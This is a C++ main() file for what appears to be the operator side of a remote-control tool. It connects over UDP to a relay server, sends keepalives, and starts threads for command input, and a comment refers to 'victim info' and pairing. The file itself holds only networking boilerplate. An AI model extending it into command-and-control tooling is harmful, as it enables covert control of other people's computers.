#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include <iostream>
#include <thread>
#include <sstream>
#include <Windows.h>
#include "controller.h"

/* possible messages form server:
c: controller accepted
n: controller info
l: victim info
e: clear clients list
d: display clients list
p: paired with 
*/

int main()
{	
    auto sendRs = [](sf::UdpSocket& s) {
        while (true)
        {
            Mlib::sleep(2000);
            s.send("r", 1, SERVER_IP, SERVER_PORT);
        }
    };  
    auto connectServer = [](sf::UdpSocket& s, bool& connected) {
        while (!connected)
        {
            std::string init = "c" + std::to_string(int(Mlib::getTime() / 1000));
            s.send(init.c_str(), init.size(), SERVER_IP, SERVER_PORT);
            Mlib::sleep(2000);
        }
    };

    sf::UdpSocket ard;
    ard.bind(sf::Socket::AnyPort);
    size_t size;
    sf::IpAddress ip;
    unsigned short port;
    char buf[1];
    bool connected = false;

    std::thread connect(connectServer, std::ref(ard), std::ref(connected));
    do {    
        ard.receive(buf, sizeof(buf), size, ip, port);
    } while (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'c');
    connected = true;
    std::thread stayAwake(sendRs, std::ref(ard));
    connect.join();

    std::cout << "started connection with server\n";
    Controller controller(&ard);
    std::thread receive(&Controller::receiveInfo, &controller);
    std::thread input(&Controller::takeCmdInput, &controller);

	return controller.controlWindow();
}	